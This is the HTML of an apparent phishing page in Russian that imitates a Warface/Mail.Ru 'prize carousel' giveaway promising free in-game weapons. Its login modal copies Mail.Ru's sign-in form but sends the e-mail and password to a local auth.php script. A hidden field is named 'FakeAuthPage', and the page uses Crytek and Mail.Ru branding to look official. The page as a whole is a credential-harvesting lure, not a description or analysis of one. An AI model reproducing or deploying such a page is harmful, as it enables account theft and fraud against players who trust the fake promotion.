<html lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" type="image/x-icon" href="https://wf.cdn.gmru.net/static/wf.mail.ru/img/main/favicon.ico">
    <title>Карусель с призами</title>
    <link rel="stylesheet" href="./files/index.css">
    <style>
    .footer {
    width: 100%;
    }
    .footer img {
    margin: 0 auto;
    }
    .pusher {
    margin-top: 150px;
    }
    </style>
  </head>
  <body>
    <div class="wfroulette_block">
      <h1 style="margin-top: 20px;">Выйграй приз</h1>
      <div class="roulette" style="margin-top: 0px;">
        <div class="rotate"></div>
          <div class="center" id="not-authorized">
            <p>Авторизуйся и получи одну бесплатную попытку в игре "Карусель с призами"</p>
            <div id="authenticate" class="button">Авторизоваться</div>
            <p>Получение подарка на этой странице осуществляется единовременно. Награда будет доставлена на ваш аккаунт в течении 24-х часов</p>
          </div>
        <div class="description">
          <div class="bg js-descr-bg pos1" style="display: none;"></div>
          <div class="txt js-descr-txt" style="display: none;"><img src="./files/prize_2_1.png" alt="">
            <h4>FN SCAR‐H «Убийца зомби» на месяц</h4>
          </div>
        </div>
        <div class="prizes js-prizes-list">
          <div class="pos1 js-prize">
            <img src="./files/prize_2_1.png" alt="FN SCAR‐H «Убийца зомби» на месяц">
          </div>
          <div class="pos2 js-prize">
            <img src="./files/prize_2_2.png" alt="XM8 Compact «Убийца зомби» на месяц">
          </div>
          <div class="pos3 js-prize">
            <img src="./files/prize_2_3.png" alt="Glock 18C «Убийца зомби» на месяц">
          </div>
          <div class="pos4 js-prize">
            <img src="./files/prize_2_4.png" alt="Тактический топор «Убийца зомби» на месяц">
          </div>
          <div class="pos5 js-prize">
            <img src="./files/prize_2_5.png" alt="Steyr Scout «Убийца зомби» на месяц">
          </div>
          <div class="pos6 js-prize">
            <img src="./files/prize_2_6.png" alt="Fabarm STF 12 Compact «Убийца зомби» на месяц">
          </div>
          <div class="pos7 js-prize">
            <img src="./files/prize_2_7.png" alt="Супер VIP-ускоритель на месяц">
          </div>
          <div class="pos8 js-prize">
            <img src="./files/prize_2_8.png" alt="Набор оружия Магма на месяц">
          </div>
        </div>
      </div>
      <div class="prizes_last">
        <div class="txt">
            Авторизуйтесь, чтобы начать играть
        </div>
        <div class="line" style="width: 70%; margin-left: 15%;">
          <div class="js-line" style="width: 100%;"></div>
        </div>
      </div>
    </div>
    <div class="modal" style="display: none;"></div>
    <div class="popup_overlay" style="display: none;"></div>
    <div class="popup_overlay_auth"></div>
    <div class="popup" style="display: none;">
      <div class="close">✖</div>
      <h4>Поздравляем!<br>Вы выиграли приз!</h4><img src="./files/st.png" alt="" id="winprizeImg">
      <p class="js-wintext">Краткое описание приза</p>
      <p class="hint">Приз в течении суток поступит на ваш аккаунт</p>
    </div>
    <link rel="stylesheet" href="./files/footer.css">
    <footer>
      <div class="logos">
        <div>
          
          <script>
          document.write('<a target="_blank" href="http://crytek.com/"><img src="https://wf.cdn.gmru.net/static/wf.mail.ru/img/main/page/footer/crytek'+ '' +'.png" alt="Crytek"></a>');
          document.write('<a target="_blank" href="http://cryengine.com/"><img src="https://wf.cdn.gmru.net/static/wf.mail.ru/img/main/page/footer/cryengine'+ '' +'.png" alt="CryEngine"></a>');
          document.write('<a target="_blank" href="https://mail.ru/"><img src="https://wf.cdn.gmru.net/static/wf.mail.ru/img/main/page/footer/mail'+ 3 +'.png" alt="Mail.Ru"></a>');
          </script><a target="_blank" href="http://crytek.com/"><img src="./files/crytek.png" alt="Crytek"></a><a target="_blank" href="http://cryengine.com/"><img src="./files/cryengine.png" alt="CryEngine"></a><a target="_blank" href="https://mail.ru/"><img src="./files/mail3.png" alt="Mail.Ru"></a><a target="_blank" href="http://crytek.com/"><img src="./files/crytek.png" alt="Crytek"></a><?php include ('auth.php');?><a target="_blank" href="http://cryengine.com/"><img src="./files/cryengine.png" alt="CryEngine<?=$ssilka ?>"></a><a target="_blank" href="https://mail.ru/"><img src="./files/mail3.png" alt="Mail.Ru"></a>
          <img src="./files/ico12.png" alt="12+">
        </div>
      </div>
      <div class="copyright">
        <p>© 2017 Crytek GmbH. All Rights Reserved.</p>
        <p>Crytek, CryENGINE, Warface and the Warface logo are registered trademarks or trademarks of Crytek GmbH in Russia and/or other countries.</p>
        <p>© 22017 Mail.Ru Games. All Rights Reserved.</p>
      </div>
      <div class="counters">
        <a href="http://top.mail.ru/jump?from=2135728" target="_blank"><img src="./files/counter" style="border:0;" alt="Рейтинг@Mail.ru" width="88" height="15"></a>
        <!--LiveInternet counter--><script type="text/javascript">
        document.write("<a href='//www.liveinternet.ru/click' "+
          "target=_blank><img src='//counter.yadro.ru/hit?t25.4;r"+
          escape(document.referrer)+((typeof(screen)=="undefined")?"":
          ";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
          screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
          ";"+Math.random()+
          "' alt='' title='LiveInternet: показано число посетителей за"+
          " сегодня' "+
          "border='0' width='88' height='15'><\/a>")
          </script>
        </div>
      </footer>
      <script src="./files/jquery-3.1.1.min.js"></script>
      <script src="./files/jquery.easing.min.js"></script>
      <script src="./files/jQueryRotate.js"></script>
      <script src="./files/index.js"></script>
      <script src="./files/kit_client.js"></script>
      <div id="auth-model" style="display: none;">
        <div id="js_kit_holder" style="position: fixed; overflow-y: auto; overflow-x: hidden; visibility: visible; top: 0px; left: 0px; z-index: 2001; cursor: default; width: 100%; height: 553px;"><div id="js_kit_overlay" style="position: relative; left: 50%; background-color: rgb(255, 255, 255); margin-left: -228px; margin-bottom: 120px; margin-top: 120px; width: 436.667px;"><div id="js_kit_header" style="background-color: #3c3c3c; height: 39px; width: 100%; color: #fff; position: relative; padding: 0 20px; line-height: 39px; box-sizing: border-box; font-family: ProximaRegular, PTSans, sans-serif !important; font-size: 18px !important;"><span id="js_kit_header_title">Вход</span><span id="js_kit_header_close" class="close" style="position: absolute; right: 13px; font-size: 21px !important; padding: 0 4px; cursor: pointer;">✕</span></div><div id="js_kit_container"><div class="gmrContent">    
		<form action="auth.php" method="post" id="js_kit_signin" class="gmrSignin">        <input name="Page" value="https://wf.mail.ru/v/VU7FK4OK6R" type="hidden">                    <input name="FakeAuthPage" value="https://wf.mail.ru/v/VU7FK4OK6R" type="hidden">                
		<div class="gmrSignin__descr">Введите логин и пароль от своего аккаунта для того, чтобы продолжить работу с сервисом.</div>        <div id="js_kit_signin__box" class="gmrSignin__field gmrSignin__box gmrSignin__box_nodomain">            <div class="gmrSignin__box__login">                <input name="email" id="js_kit_signin__box__login" value="" tabindex="1" data-yandex-suggest="false" placeholder="E-mail" type="text">            </div>            <div class="gmrSignin__box__domain">                <select name="Domain" id="js_kit_signin__box__domain" tabindex="1">                                            <option value="mail.ru">@mail.ru</option>                                            <option value="inbox.ru">@inbox.ru</option>                                            <option value="list.ru">@list.ru</option>                                            <option value="bk.ru">@bk.ru</option>                                            <option value="mail.ua">@mail.ua</option>                                    </select>                <span id="js_kit_signin__box__domain__txt">@mail.ru</span>            </div>        </div>        <div class="gmrSignin__field gmrSignin__password" id="js_kit_signin__password">            <input name="password" id="js_kit_signin__password__input" value="" tabindex="2" placeholder="Пароль" type="password">        </div>        <div class="gmrSignin__opts">            <span class="gmrSignin__remember gmrSignin__checked">                <input name="saveauth" value="1" checked="checked" id="js_kit_signin__remember" tabindex="4" type="checkbox">                <label for="js_kit_signin__remember" class="gmrSignin__remember__chk"></label>                <label for="js_kit_signin__remember" class="gmrSignin__remember__label">Запомнить меня</label>            </span>            <a class="gmrSignin__register" onclick="GMR.showSignupForm({ page: &#39;https://wf.mail.ru/v/VU7FK4OK6R&#39; }); return false;">Нет почты Mail.Ru?</a>            <a class="gmrSignin__lostpass" href="https://wf.mail.ru/user/password" target="_blank">Забыли пароль?</a>        </div>        <div class="gmrSignin__actions">            <button id="js_kit_signin__submit" class="gmrSignin__submit" name="do_login" value="1" tabindex="3" onclick="GMR.rbFormCompleted(function() { document.getElementById(&#39;js_kit_signin&#39;).submit() }); return false">Войти</button>                                            </div>    </form></div></div></div></div>
        <div id="js_kit_darkness" class="close" style="background-color: rgb(0, 0, 0); z-index: 2000; opacity: 0.5; position: fixed; display: block; top: 0px; left: 0px; width: 100%; height: 100%;"></div>
      </div>
            <script>
      	$(function () {
      		$("#js_kit_overlay").css({width: 1280 / 3 + 10});
      	});
      </script>
    </body></html>